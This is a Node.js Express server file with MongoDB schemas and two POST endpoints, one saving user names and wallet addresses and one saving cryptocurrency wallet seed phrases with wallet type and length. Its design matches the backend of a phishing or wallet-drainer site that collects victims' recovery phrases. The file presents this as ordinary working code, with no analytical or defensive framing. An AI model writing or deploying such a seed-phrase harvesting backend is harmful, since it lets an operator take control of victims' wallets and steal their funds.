require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware to parse JSON bodies
app.use(express.json());

// Serve static files (your index.html, styles.css, etc.)
app.use(express.static(path.join(__dirname)));

// Add this route to serve index.html for the root path
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI)
  .then(() => console.log('MongoDB connected successfully'))
  .catch(err => console.error('MongoDB connection error:', err));

// Define a schema for storing seed phrases
const SeedPhraseSchema = new mongoose.Schema({
  wallet: {
    type: String,
    required: true,
  },
  seedPhrase: {
    type: String,
    required: true,
  },
  phraseLength: {
    type: Number,
    required: true,
  },
  timestamp: {
    type: Date,
    default: Date.now,
  },
});

const SeedPhrase = mongoose.model('SeedPhrase', SeedPhraseSchema);

// Define a schema for storing user details
const UserDetailSchema = new mongoose.Schema({
  userName: {
    type: String,
    required: true,
  },
  walletAddress: {
    type: String,
    required: true,
  },
  timestamp: {
    type: Date,
    default: Date.now,
  },
});

const UserDetail = mongoose.model('UserDetail', UserDetailSchema);

// API endpoint to receive user details
app.post('/api/userdetails', async (req, res) => {
  try {
    const { userName, walletAddress } = req.body;

    if (!userName || !walletAddress) {
      return res.status(400).json({ message: 'Missing required fields: userName or walletAddress' });
    }

    const newUserDetail = new UserDetail({
      userName,
      walletAddress,
    });

    await newUserDetail.save();
    res.status(201).json({ message: 'User details saved successfully!' });
  } catch (error) {
    console.error('Error saving user details:', error);
    res.status(500).json({ message: 'Internal server error' });
  }
});

// API endpoint to receive seed phrase data
app.post('/api/seedphrase', async (req, res) => {
  try {
    const { wallet, seedPhrase, phraseLength } = req.body;

    if (!wallet || !seedPhrase || !phraseLength) {
      return res.status(400).json({ message: 'Missing required fields: wallet, seedPhrase, or phraseLength' });
    }

    const newSeedPhrase = new SeedPhrase({
      wallet,
      seedPhrase,
      phraseLength,
    });

    await newSeedPhrase.save();
    res.status(201).json({ message: 'Seed phrase saved successfully!' });
  } catch (error) {
    console.error('Error saving seed phrase:', error);
    res.status(500).json({ message: 'Internal server error' });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});